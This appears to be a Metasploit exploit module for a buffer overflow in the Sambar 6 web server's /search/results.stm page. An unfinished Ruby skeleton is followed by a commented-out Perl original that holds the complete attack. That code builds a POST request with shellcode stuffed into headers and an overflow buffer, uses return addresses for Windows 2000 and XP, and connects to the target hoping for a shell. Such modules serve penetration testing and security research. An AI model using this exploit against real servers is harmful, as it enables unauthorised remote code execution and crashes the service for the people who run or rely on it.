require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Sambar 6 Search Results Buffer Overflow',
			'Description'    => %q{
				This exploits a buffer overflow found in the
				/search/results.stm application that comes with Sambar 6.
				This code is a direct port of Andrew Griffiths's SMUDGE
				exploit, the only changes made were to the nops and payload.
				This exploit causes the service to die, whether you provided
				the correct target or not.
					
			},
			'Author'         => [ 'hdm', 'Andrew Griffiths <andrewg@felinemenace.org>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '2204'],
					[ 'MIL', '56'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 2000,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000, winxp',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Jun 21 2003',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::sambar6_search_results;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'    => 'Sambar 6 Search Results Buffer Overflow',
	'Version' => '$Revision$',
	'Authors' =>
	  [
		'H D Moore <hdm [at] metasploit.com>',
		'Andrew Griffiths <andrewg [at] felinemenace.org>'
	  ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp' ],
	'Priv'  => 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'  => 2000, # yes, we have as much space as we want :)
		'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",

		# example of allowing A-Z, a-z, 0-9, 0xc0+ only
		#join("", map { $_=chr($_) } (0x00 .. 0x2f)).
		#join("", map { $_=chr($_) } (0x3a .. 0x40)).
		#join("", map { $_=chr($_) } (0x5B .. 0x60)).
		#join("", map { $_=chr($_) } (0x7B .. 0xC0)),
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This exploits a buffer overflow found in the
        /search/results.stm application that comes with Sambar 6.
        This code is a direct port of Andrew Griffiths's SMUDGE
        exploit, the only changes made were to the nops and payload.
        This exploit causes the service to die, whether you provided
        the correct target or not.
}),
	'Refs'  =>
	  [
		['OSVDB', 2204],
		['MIL', '56'],
	  ],

	'Targets' =>
	  [
		['Windows 2000', 0x74fdee63, 0x773368f4],
		['Windows XP',   0x77da78ff, 0x77e631ea],
	  ],

	'Keys'  => ['sambar'],

	'DisclosureDate' => 'Jun 21 2003',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];
	my ($opsys, $jmpesp, $retaddr) = @{ $target };

	$self->PrintLine("[*] Attemping to exploit Sambar with target '$opsys'");

	my $request =
	  "POST /search/results.stm HTTP/1.1\r\n".
	  "Host: $target_host:$target_port\r\n".
	  "User-Agent: $shellcode\r\n".
	  "Accept: $shellcode\r\n".
	  "Accept-Encoding: $shellcode\r\n".
	  "Accept-Language: $shellcode\r\n".
	  "Accept-Ranges: $shellcode\r\n".
	  "Referrer: $shellcode\r\n".
	  "Connection: Keep-Alive\r\n".
	  "Pragma: no-cache\r\n".
	  "Content-Type: $shellcode\r\n";

# we use \xfc (cld) as nop, this code goes through tolower() and must be 0xc0->0xff
# int3's DO NOT WORK because it triggers an exception and causes the server to exit
	my $jmpcode = "\xfc"."h". pack("V", $retaddr) . "\xfc\xfc\xfc"."\xc2\x34\xd1";
	my $bigbuff = $jmpcode . ("X" x (128 - length($jmpcode))) . pack("VV", $jmpesp, $jmpesp) . $jmpcode;
	my $content = "style=page&spage=0&indexname=docs&query=$bigbuff";

	$request .= "Content-Length: " . length($content) . "\r\n\r\n" . $content;

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
	$s->Send($request);

	$self->PrintLine("[*] Waiting for a response...");
	my $r = $s->Recv(-1);
	if(!$r) {
		$self->PrintLine("[*] Didn't get response, hoping for shell anyway");
	}
	else {
		$self->PrintLine('[*] Got Response');
	}

	sleep(2);
	$s->Close();
}


=end


end
end	
